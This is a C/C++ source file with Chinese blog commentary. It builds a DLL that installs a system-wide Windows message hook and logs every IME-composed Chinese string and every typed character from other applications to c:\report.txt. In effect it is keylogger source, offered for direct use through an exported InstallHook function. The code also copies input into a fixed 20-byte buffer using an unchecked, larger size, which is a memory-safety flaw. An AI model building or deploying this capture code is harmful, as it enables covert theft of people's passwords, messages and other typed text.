// WM_IME_COMPOSITION消息
// 	2007-06-29 08:43
// 	以前一直没有注意到一个问题,就是用键盘钩子截获字符输入时是截不到特殊字符的,比方说中文输入法之类的.
// 	后来用到了消息钩子去HOOK WM_IME_CHAR,这时候大部分已经能够获取了,但是对于其他一些程序,比方说
// 	WORD之类的也就不能截获了.后来到MSDN上查到, 要用到WM_IME_COMPOSITION消息,并且在处理该消息
// 	时要用到IMM的一些库函数从输入法数据区中获取.比方说ImmGetContext,ImmGetCompositionString等等.
// 以下是源代码:

//HOOK IME TO GET CHINESE INPUT CHAR
//MAKE BY ZWELL
//2004.12.9
//THIS WILL BUILD HOOK.DLL, IF YOU WANT TO USE, JUST USE THE EXPORT FUNCTION INSTALLHOOK
//ADDTION: YOU MUST ADD THE IMM32.LIB INTO PROJECT, OTHERWISE, IT CAN NOT BE PASS...'
#include "windows.h"
#include "imm.h"
#include "stdio.h"
#include <tchar.h>
#pragma comment(lib, "Imm32.lib")

#define HOOK_API __declspec(dllexport)

HHOOK         g_hHook             = NULL;         //hook句柄
HINSTANCE     g_hHinstance     = NULL;         //程序句柄

LRESULT CALLBACK MessageProc(int nCode,WPARAM wParam,LPARAM lParam)
{    
	LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);
	PMSG pmsg = (PMSG)lParam;
	if (nCode == HC_ACTION)
	{

		switch (pmsg->message)
		{
		case WM_IME_COMPOSITION: 
			{
				HIMC hIMC;
				HWND hWnd=pmsg->hwnd;
				DWORD dwSize;
				char ch;
				char lpstr[20];
				if(pmsg->lParam & GCS_RESULTSTR)
				{
					//先获取当前正在输入的窗口的输入法句柄
					hIMC = ImmGetContext(hWnd);
					if (!hIMC)
					{
						MessageBox(NULL, "ImmGetContext","ImmGetContext", MB_OK);
					}

					POINT pt = {};
					::GetCaretPos(&pt);
					COMPOSITIONFORM info;
					info.dwStyle = CFS_POINT;
					info.ptCurrentPos.x = pt.x;
					info.ptCurrentPos.y = pt.y;
					::ImmSetCompositionWindow(hIMC, &info);

					// 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.
					dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);

					// 缓冲区大小要加上字符串的NULL结束符大小,
					//   考虑到UNICODE
					dwSize += sizeof(WCHAR);

					memset(lpstr, 0, 20);

					// 再调用一次.ImmGetCompositionString获取字符串
					LONG len = ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);

					//现在lpstr里面即是输入的汉字了。你可以处理lpstr,当然也可以保存为文件...
					//MessageBox(NULL, lpstr, lpstr, MB_OK);
					FILE* f1;
					f1=fopen("c:\\report.txt","a+");	
					char szBuf[] = "STR:";
					fwrite(&szBuf,1,strlen(szBuf),f1);
					fwrite(lpstr,1,len,f1);
					fclose(f1);   

					ImmReleaseContext(hWnd, hIMC);
				}
			}
			break;
		case WM_CHAR:   //截获发向焦点窗口的键盘消息
			{
				FILE* f1;
				f1=fopen("c:\\report.txt","a+");
				char ch=(char)(pmsg->wParam);
				char szBuf[] = "CHAR:";
				fwrite(&szBuf,1,strlen(szBuf),f1);
				fwrite(&ch,1,1,f1);
				fclose(f1);    
			}
			break;
		}
	}

	return(lResult);
}

HOOK_API BOOL InstallHook()
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)MessageProc,g_hHinstance,0);
	return TRUE;
}

HOOK_API BOOL UnHook()
{       
	return UnhookWindowsHookEx(g_hHook);
}

BOOL APIENTRY DllMain( HANDLE hModule,
	DWORD   ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance=(HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

